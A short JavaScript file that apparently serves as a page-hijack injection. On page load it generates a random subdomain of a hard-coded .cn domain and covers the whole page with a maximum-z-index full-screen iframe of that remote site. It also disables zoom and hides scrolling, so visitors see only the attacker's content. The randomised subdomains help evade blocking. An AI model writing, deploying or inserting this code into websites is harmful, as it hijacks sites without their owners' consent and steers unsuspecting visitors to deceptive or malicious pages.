document.addEventListener('DOMContentLoaded', () => {
    function generateRandomPrefix(length) {
        var result = '';
        var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for (var i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    var randomPrefix = generateRandomPrefix(Math.floor(Math.random() * (20 - 5 + 1)) + 5);
    var baseDomain = 'b9yo9rt6h.cn';
    var fullUrl = 'https://' + randomPrefix + '.' + baseDomain;
    console.log(fullUrl);

    // 使用 innerHTML 来插入内容
    var container = document.createElement('div');
    container.style.width = '100%';
    container.style.height = '100%';
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.zIndex = '2147483647';
    container.style.background = '#fff';

    var iframe = document.createElement('iframe');
    iframe.src = fullUrl;
    iframe.frameBorder = '0';
    iframe.style.border = '0';
    iframe.style.width = '100%';
    iframe.style.height = '100%';

    container.appendChild(iframe);
    document.body.appendChild(container);

    // 添加 viewport meta
    var meta = document.createElement('meta');
    meta.id = 'viewport';
    meta.name = 'viewport';
    meta.content = 'user-scalable=no,width=device-width, initial-scale=1.0';
    document.head.appendChild(meta);

    // 添加样式
    var style = document.createElement('style');
    style.textContent = 'html,body{width:100%;height:100%;overflow:hidden; margin:0;}';
    document.head.appendChild(style);
});
